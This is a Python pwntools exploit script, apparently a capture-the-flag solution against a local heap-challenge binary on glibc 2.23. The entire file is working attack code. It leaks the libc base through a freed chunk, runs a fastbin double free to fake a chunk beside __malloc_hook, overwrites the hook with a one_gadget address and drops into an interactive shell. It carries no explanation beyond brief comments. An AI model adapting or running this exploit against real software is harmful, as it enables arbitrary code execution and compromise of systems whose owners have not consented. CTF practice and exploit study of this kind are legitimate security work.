#!/usr/bin/env python3
# coding = utf-8

# Env: Ubuntu 16.04.7 LTS, GLIBC 2.23-0ubuntu11.3

from pwn import *
context(arch = "amd64", os = "linux", log_level = "debug")
context.terminal = ['/usr/bin/tmux', 'splitw', '-h']

p = process('./CaNaKMgF_remastered')
elf = ELF('./CaNaKMgF_remastered')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
# gdb.attach(p, "")
# time.sleep(1)

def menu(option):
    p.recvuntil("5. Run away\n")
    p.sendline(option)

def allocate(size, data):
    menu("1")
    p.recvuntil("Length? ")
    p.sendline(f"{size}")
    p.send(data)

def free(index):
    menu("3")
    p.recvuntil("Num? ")
    p.sendline(f"{index}")

def read(index):
    menu("4")
    p.recvuntil("Num? ")
    p.sendline(f"{index}")
    data = p.recvuntil("\n1. Allocate\n")
    return data[:-13]

# Leak libc base
allocate(0x100, 'a') # 0
allocate(0x100, 'a') # 1
free(0)
main_arena_p88 = u64(read(0).ljust(8, b'\x00'))
print(f"main_arena + 88: {hex(main_arena_p88)}")
libc_base = main_arena_p88 - 0x3c4b78
print(f"libc_base: {hex(libc_base)}")
free(1)

# Double free
allocate(0x60, 'a') # 2
allocate(0x60, 'a') # 3
allocate(0x60, 'a') # 4
free(2)
free(3)
free(2)

# Overwrite __malloc_hook by fake a chunk at (char *)__malloc_hook - 0x23
__malloc_hook = libc_base + libc.symbols['__malloc_hook']

allocate(0x60, p64(__malloc_hook - 0x23)) # 5
allocate(0x60, 'a') # 6
allocate(0x60, 'a') # 7

one_gadget = libc_base + 0xf03a4 # constraints: [rsp+0x50] == NULL
allocate(0x60, b'a' * 0x13 + p64(one_gadget)) # 8
free(6)
free(6)

p.interactive()